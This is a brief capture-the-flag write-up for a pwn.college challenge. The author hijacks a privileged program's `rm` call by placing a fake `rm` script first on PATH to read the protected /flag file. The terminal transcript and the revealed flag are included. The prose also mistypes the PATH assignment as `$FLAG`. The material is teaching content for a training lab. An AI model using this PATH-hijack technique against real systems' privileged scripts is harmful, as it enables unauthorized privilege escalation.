# Hijacking commands

The description says that the program will delete `rm` command but not print the flag.
We have to create a shellscript wich is `rm` and invoke `cat /flag` in it.
After that we have to add `/home/hacker` directory by `PATH="/home/hacker:$FLAG"`.
After this we have to run `/challenge/run` and we will get the flag.

```bash
muizz@LAPTOP-VF1FT9IQ:~$ ssh -i ./key hacker@dojo.pwn.college
Connected!
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ ls -l rm
-rw-r--r-- 1 hacker hacker 0 Oct 17 17:23 rm
hacker@path~hijacking-commands:~$ chmod a+x rm
hacker@path~hijacking-commands:~$ ls -l rm
-rwxr-xr-x 1 hacker hacker 0 Oct 17 17:23 rm
hacker@path~hijacking-commands:~$ PATH="/home/hacker:$PATH"
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
hacker@path~hijacking-commands:~$ cat flag
cat: flag: No such file or directory
hacker@path~hijacking-commands:~$ cat /flag
cat: /flag: Permission denied
hacker@path~hijacking-commands:~$ cat /flag
cat: /flag: Permission denied
hacker@path~hijacking-commands:~$ sudo cat /flag
sudo: workspace is not privileged
hacker@path~hijacking-commands:~$ su cat /flag
su: user cat does not exist
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{casYCBxABQIbgmSDfqe8sXgQqj2.ddzNyUDLwMjN0czW}
hacker@path~hijacking-commands:~$
```

This is how I solved it
